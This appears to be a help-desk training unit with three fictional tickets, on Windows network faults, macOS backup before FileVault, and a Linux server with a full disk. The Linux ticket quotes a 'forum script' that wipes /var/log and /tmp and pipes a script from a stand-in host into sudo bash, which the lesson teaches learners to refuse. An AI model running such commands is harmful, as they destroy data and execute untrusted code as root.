3.11 — Unit 3 Tickets
Instructions — Read Before You Begin

What This Is

Three help-desk tickets, one for each class meeting this unit. Work each one on your own. Every ticket is a real kind of call, with real evidence, and three questions that ask what a technician would actually do next. Plan on about 20 minutes per ticket.

How to Work a Ticket

  1. Read the call, then stop. Before you look at any evidence, write one sentence in your notes: what do you think is wrong, and how sure are you? You will come back to it.
  2. Study the exhibits as if you had just collected them from the user's computer.
  3. Answer the three questions. Each one stands on its own. You get one attempt per question.
  4. Write your own progress note, then compare it with the Ticket Solution.
  5. Look back. The reflection prompts sit inside the Ticket Solution, below the solution itself. Answer them in your notes. They are about your thinking, not the content, and nobody else will see them.

What You Will See When You Answer

  • A flag that says Correct or Incorrect — nothing more. You will not be shown which answer was right.
  • If you miss one, go back to the exhibit and the call and work out why. That search is the lesson.
  • Answer all three correctly and the Ticket Solution opens on its own. Otherwise, click Ticket Solution to open it yourself — after you have written your note. The Look Back prompts are inside it.
  • Reset These Questions clears a ticket so you can work it again.

About the Exhibits

Each ticket includes exhibits labeled A, B, and C. Every exhibit is representative of the output from the computer being troubleshot — what you would see on that machine's screen if you opened the tool or settings window, or ran the command shown. Treat them as evidence you collected yourself during the call.

They are simplified to show what matters, the same way a performance-based question on the 220-1202 exam presents a tool or a command's output. Read them the way a technician reads a screen: column headings first, then the values that stand out, then the details that do not fit.

The Method Behind Every Ticket

Each question is tagged with the step of CompTIA's troubleshooting method it exercises. You will use this method for the rest of your career; these tickets are where it becomes a habit.

  1. Identify the problem
  2. Establish a theory of probable cause
  3. Test the theory to determine the cause
  4. Establish a plan of action to resolve the problem and implement the solution
  5. Verify full system functionality and, if applicable, implement preventive measures
  6. Document findings, actions, and outcomes

About the Times and Names

Every person, company, and device in these tickets is fictional. Times shown inside a ticket are part of the scenario, not course deadlines — course due dates are always in the Course Schedule.

Ticket 1 of 3 Connected, But Nothing Works Tuesday · Objective 1.7 — Windows client networking · About 20 minutes
Ticket HD-3-1006
PriorityHigh — shipping is stopped at one workstation
CategoryNetwork connectivity
CallerRay Simmons, Shipping Supervisor, Catawba Freight
DeviceAsset CF-WH-14 · Warehouse desktop · Windows 11 Pro · wired Ethernet
The Call

"The shipping computer says it's connected — there's even the little network icon — but nothing works. No internet, can't print labels, can't get into the order system. The forklift guys moved some racks this morning, if that matters."

Every other computer on the warehouse floor is working normally. The warehouse uses DHCP for its workstations.

Close the Ticket

Write your own progress note and resolution first — all three findings, in the order you found them. Then open the Ticket Solution below to compare.

Ticket Solution

Reported: warehouse shipping PC shows a connection but reaches nothing; racks were moved this morning.

Found: 169.254 address — no DHCP response. Network cable behind the moved racks had been pulled partly out of the wall jack. After reseating, valid DHCP address; gateway and internet reachable, but names failed: a manually entered DNS server (10.40.9.53) did not match the warehouse DNS server (10.40.2.53). Network profile set to Public, hiding shared folders.

Action: reseated and secured the cable; set DNS to obtain automatically, matching the other workstations; set this trusted company network to Private. Labels print and the order system opens.

Preventive: asked facilities to route the cable away from the rack path. Noted the manual DNS entry so whoever set it can be asked why, without assuming fault.

Look Back

  1. Ray said the racks moved "if that matters." Did you use that clue? What do users tell you that you might be tempted to ignore?
  2. Fixing the cable revealed a second problem that had been hidden behind the first. How do you know when you are actually finished?
  3. Someone typed that DNS address by hand at some point. How would you find out why, without making anyone feel accused?
  4. You set the profile to Private. What could go wrong if a technician made that change on a network that is not trusted?
Ticket 2 of 3 The Designer's Mac, the Night Before a Trip Wednesday · Objective 1.8 — macOS features and tools · About 20 minutes

PriorityHigh — a deadline tomorrow morning
CategorymacOS · Backup · Security
CallerElena Vasquez, Senior Designer, Brightline Creative

"I fly to a client presentation first thing tomorrow. My design app is frozen with the spinning wheel and it won't quit, and I haven't saved since lunch. I also just realized my backup drive hasn't been plugged in for weeks. And our insurance says any laptop leaving the office has to be encrypted. Can you help me before five?"

Elena's backup drive is in her desk drawer. Company policy requires encryption for laptops that travel, and a recovery key held by IT.

Close the Ticket

Write your own progress note and resolution first — including the order you did things in. Then open the Ticket Solution below to compare.

Ticket Solution

Reported: design application frozen with unsaved work; backup drive not connected for weeks; laptop must be encrypted before travel tomorrow.

Action, in order: Force Quit PixelForge; reopened it and recovered the autosaved version from mid-afternoon, losing about 40 minutes of work. Connected "Studio Backup"; Time Machine completed a full backup. Only then enabled FileVault, with the recovery key escrowed to IT; encryption continued in the background and finished before she left.

Why that order: a current backup before encryption means a problem during encryption costs nothing.

Preventive: set a weekly reminder for the backup drive and suggested a second, offsite backup.

Look Back

  1. Return to the order you wrote down. Did you put the backup before the encryption? What could have gone wrong the other way around?
  2. Elena lost about 40 minutes of work. How do you tell someone that, the night before a presentation, without adding to their stress?
  3. You may not use a Mac every day. Which of your Windows habits carried straight over, and which did not?
  4. The recovery key was escrowed to IT. What happens to Elena's data if nobody can find that key?
Ticket 3 of 3 The Store Stopped Taking Orders Thursday · Objectives 1.9 and 4.8 — Linux and scripting · About 20 minutes
Ticket HD-3-1019
PriorityCritical — the online store is down
CategoryLinux server · Storage
CallerDev Patel, Operations Lead, Blue Ridge Outfitters
DeviceServer BRO-WEB-01 · Linux · you have SSH access
The Call

"Our online store stopped taking orders about an hour ago. The error page says something about not being able to write files. Someone on a forum posted a script that cleans up Linux servers automatically — should I just run it?"

The store application writes its own log files to /var/log/storeapp. The server has a second, larger drive mounted at /data. The company must keep application logs for 90 days.

Stop Here

Dev wants to run the script. Before the exhibits, write down your answer to him, and what you would check first.

Exhibit A — Output of df -h

Filesystem      Size  Used Avail Use% Mounted on
/dev/sda2        50G   50G     0 100% /
/dev/sdb1       200G   12G  188G   6% /data

Exhibit B — Output of du -sh /var/log/* (largest entries)

38G   /var/log/storeapp
410M  /var/log/journal
22M   /var/log/syslog

Exhibit C — The forum script Dev wants to run

#!/bin/bash
# "Free up space fast!"
sudo rm -rf /var/log/*
sudo rm -rf /tmp/*
curl -s http://linux-speedup.example/boost.sh | sudo bash

Close the Ticket

Write your own progress note and resolution first — including what you told Dev about the script. Then open the Ticket Solution below to compare.

Ticket Solution

Reported: online store unable to write files; orders stopped.

Found: df -h — root filesystem 100% full; /data 6% used. du — /var/log/storeapp using 38 GB; the application log had never been rotated.

Action: moved store application logs older than 7 days to /data/archive and compressed them, preserving the 90-day retention; root filesystem at 41%; store taking orders again. Configured log rotation for the store application.

Not done, deliberately: the forum script was not run. It would have deleted all logs, including those the company must keep, and downloaded and executed an unknown script as an administrator.

Preventive: recommended an alert when the root filesystem passes 80%.

Look Back

  1. Dev asked, "Should I just run it?" Under pressure, what made the script tempting? What would have made it tempting to you?
  2. The script would have "worked" — the disk would have had space again. What else would it have done, and how long before anyone noticed?
  3. The real cause was a missing log rotation. Who should own the permanent fix, and how would you tell them?
  4. Write your rule for scripts you did not write. Make it short enough to remember during an outage.
What These Tickets Give You
  • Reading ipconfig output and a network profile to separate a cable fault from a DNS fault from a sharing fault
  • Doing the right things in the right order on a Mac, without needing to own one
  • Saying no to a tempting script during an outage, and fixing the cause instead of the symptom
  • Progress notes another technician could pick up without asking you a single question
